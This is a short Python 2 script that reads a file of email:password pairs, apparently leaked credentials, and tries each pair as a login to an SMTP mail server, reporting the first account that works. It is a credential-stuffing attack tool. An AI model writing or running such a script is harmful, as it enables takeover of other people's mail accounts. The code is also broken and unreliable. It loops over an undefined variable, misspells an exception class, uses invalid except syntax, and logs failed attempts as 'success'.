import smtplib

f = open('wap.txt','r')
emails = f.read().split('\n')
info = [i.split(':') for i in website if (i.find('Wapsite.com')>0)]
f.close()

#print '\n'.join(map(str, info))
#exit(0)


for i in  info:
	s = smtplib.SMTP('smtp.wap.com:587')
	s.ehlo()
	s.starttls()
	s.ehlo()
	try:
		ans = s.login(i[0], i[1])
		print 'Success: '+i[0]
		print 'Wapsite Wap site: '+i[1]
		exit(0)
	except smtplib.SMTPAuthenticatio, smtplib.SMTPServerDisconnected:
		log = 'Attempt to login as user '+i[0]+' with password '+i[1].split('\r')[0]+'success'
		print(log)
